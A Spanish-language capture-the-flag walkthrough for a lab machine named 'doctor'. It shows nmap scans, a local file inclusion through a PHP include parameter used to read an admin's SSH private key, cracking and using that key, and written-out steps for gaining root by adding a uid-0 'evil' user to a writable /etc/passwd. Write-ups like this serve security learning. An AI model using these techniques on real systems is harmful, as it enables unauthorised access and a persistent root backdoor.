# Máquina doctor

### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 192.168.42.171

![alt text](image-1.png)

### Servicios y versiones 

sudo nmap -sV --script vuln -p22,80 --min-rate 6000 -vvv 192.168.42.171

![alt text](image-3.png)

### Fuzzing web

![alt text](image-8.png)

### Entramos en la web

Al entrar en la web en el apartado doctors vemos que hay un archivo doctor-item.php con el parámetro include que llama a un archivo Doctors.html, lo que puede ser un LFI

![alt text](image-2.png)

Probamos LFI:

![alt text](image-4.png)

vemos que tenemos un usuario admin, vemos su id_rsa

![alt text](image-5.png)

copiamos el id_rsa y le sacamos el hash para crackearlo:

![alt text](image-6.png)

### Explotación

Nos conectamos mediante ssh:

![alt text](image-7.png)


### Escalar privilegios

Ejecutando la herramienta linpeas:

![alt text](image-9.png)

paso 1.- Genera una contraseña encriptada:

openssl passwd -1 "tupassword"

ejemplo de salida

pass_encriptada:

$1$2VcIqLB2$U.mQFZi487fsL.e9EyzU10

Paso 2: ejecuta nano /etc/passwd

añade la línea

evil:pass_encriptada:0:0:root:/root:/bin/bash

Paso 3: su evil

escribimos la contraseña tupassword

listo somos root !!!

![alt text](image-10.png)

![alt text](image-11.png)

### user.txt

![alt text](image-12.png)

### root.txt

![alt text](image-13.png)